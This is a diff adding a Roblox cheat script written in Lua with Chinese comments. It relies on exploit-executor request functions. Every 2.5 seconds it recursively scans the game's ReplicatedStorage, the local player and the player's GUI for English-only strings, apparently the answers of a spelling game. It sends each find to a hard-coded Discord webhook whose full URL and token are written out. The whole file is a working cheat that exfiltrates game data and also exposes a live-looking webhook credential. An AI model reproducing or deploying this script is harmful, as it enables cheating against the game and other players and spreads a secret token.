@@ -1,0 +1,114 @@
+-- 0x商城 - 全域參數地毯式掃描器（已過濾數字干擾）
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local localPlayer = Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1509926966550069260/UmXVaBTRN0YzAV0HOa_tFVosJuXXxShY2Gnm-qbFmUmt19wEzbDeoKmO5vkdb66qrUTu"
+
+-- 儲存已經發送過的數據，避免重複
+local sentDataCache = {}
+
+-- 🟢 核心過濾函數：檢查數值是否符合拼字遊戲的特徵
+local function isValidWord(val)
+	local str = tostring(val)
+	
+	-- 1. 如果長度小於等於 1，或者為空，排除
+	if #str <= 1 then return false end
+	
+	-- 2. 【核心修改】如果字串中包含任何數字 (0-9)，直接排除
+	if string.match(str, "%d") then return false end
+	
+	-- 3. 排除掉常見的系統預設字
+	if str == "Label" or str == "Text" or str == "TextBox" then return false end
+	
+	-- 4. 必須包含至少一個英文字母
+	return string.match(str, "%a+") ~= nil
+end
+
+-- 發送 Webhook 函數
+local function sendWebhook(infoType, path, value)
+	local cacheKey = path .. tostring(value)
+	if sentDataCache[cacheKey] then return end -- 數值沒變就跳過
+	sentDataCache[cacheKey] = true
+
+	local httpService = game:GetService("HttpService")
+	local embedData = {
+		["embeds"] = {{
+			["title"] = "🎯 0x商城 - 拼字遊戲候選參數回報",
+			["color"] = 65535, -- 青藍色
+			["fields"] = {
+				{["name"] = "📁 參數類型", ["value"] = "`" .. infoType .. "`", ["inline"] = true},
+				{["name"] = "🔑 參數路徑", ["value"] = "```lua\n" .. path .. "\n```", ["inline"] = false},
+				{["name"] = "📊 目前純英文字串", ["value"] = "```\n" .. tostring(value) .. "\n```", ["inline"] = false}
+			},
+			["timestamp"] = DateTime.now():ToIsoDate()
+		}}
+	}
+
+	local jsonPayload = httpService:JSONEncode(embedData)
+	local sendRequest = request or http_request or (syn and syn.request)
+	
+	if sendRequest then
+		task.spawn(function()
+			sendRequest({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = jsonPayload
+			})
+		end)
+	end
+end
+
+-- 深度遞迴掃描函數
+local function deepScan(object)
+	local success, children = pcall(function() return object:GetChildren() end)
+	if not success or not children then return end
+
+	for _, child in ipairs(children) do
+		-- 1. 檢查 ValueBase 系列
+		if child:IsA("ValueBase") then
+			local val = child.Value
+			if isValidWord(val) then
+				sendWebhook("ValueObject (" .. child.ClassName .. ")", child:GetFullName(), val)
+			end
+		end
+
+		-- 2. 檢查 UI 文字元素
+		if child:IsA("TextLabel") or child:IsA("TextBox") or child:IsA("TextButton") then
+			local text = child.Text
+			if isValidWord(text) then
+				sendWebhook("UI Text (" .. child.ClassName .. ")", child:GetFullName(), text)
+			end
+		end
+
+		-- 3. 檢查 Attributes
+		local attributes = child:GetAttributes()
+		if next(attributes) ~= nil then
+			for attrName, attrValue in pairs(attributes) do
+				if isValidWord(attrValue) then
+					local path = child:GetFullName() .. " -> [Attribute: " .. attrName .. "]"
+					sendWebhook("Instance Attribute", path, attrValue)
+				end
+			end
+		end
+
+		-- 繼續向下遞迴
+		deepScan(child)
+	end
+end
+
+-- 開始執行全域大掃描
+task.spawn(function()
+	print("📡 0x商城 - 純英文字串地毯式掃描已啟動（數字已屏蔽）...")
+	
+	while true do
+		deepScan(ReplicatedStorage)
+		deepScan(localPlayer)
+		if localPlayer:FindFirstChild("PlayerGui") then
+			deepScan(localPlayer.PlayerGui)
+		end
+		
+		task.wait(2.5) -- 每 2.5 秒全面巡邏一次
+	end
+end)
